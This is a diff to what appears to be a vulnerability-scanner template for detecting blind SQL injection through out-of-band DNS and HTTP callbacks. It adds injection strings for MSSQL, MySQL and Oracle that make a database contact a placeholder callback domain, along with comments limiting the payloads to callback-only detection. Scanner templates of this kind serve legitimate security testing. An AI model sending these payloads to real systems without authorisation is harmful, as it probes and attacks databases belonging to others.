@@ -24,7 +24,20 @@ tests: tests/fixtures/blind-sqli-oob/
 request:
   method: GET
   param_names: [id, query, search, q, page, cat, item, user]
-  payload: "'; EXEC master..xp_dirtree '\\\\gash-{correlation}.oob.example\\share'--"
+  # Callback-only corpus: every expression merely makes the database engine
+  # resolve or fetch the unique OOB hostname of its own attempt. No table
+  # reads, no writes, no command execution, no data exfiltration: a real
+  # callback to the operator's self-hosted server is the only evidence.
+  # PostgreSQL is deliberately absent: without COPY/dblink (out of scope,
+  # no-command-execution rule) it has no callback-only primitive; the gap
+  # is documented in docs/known-limits.md.
+  payload: "'; EXEC master..xp_dirtree '\\\\{{OOB_DOMAIN}}\\share'-- -"
+  payloads:
+    - "'; EXEC master..xp_fileexist '\\\\{{OOB_DOMAIN}}\\share\\gash'-- -"
+    - "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\{{OOB_DOMAIN}}\\\\gash'))-- -"
+    - "1' AND LOAD_FILE('\\\\\\\\{{OOB_DOMAIN}}\\\\x')-- -"
+    - "' AND UTL_INADDR.GET_HOST_ADDRESS('{{OOB_DOMAIN}}') IS NOT NULL-- -"
+    - "' AND UTL_HTTP.REQUEST('http://{{OOB_DOMAIN}}/gash') IS NOT NULL-- -"
 oracle:
   name: oob
   params:
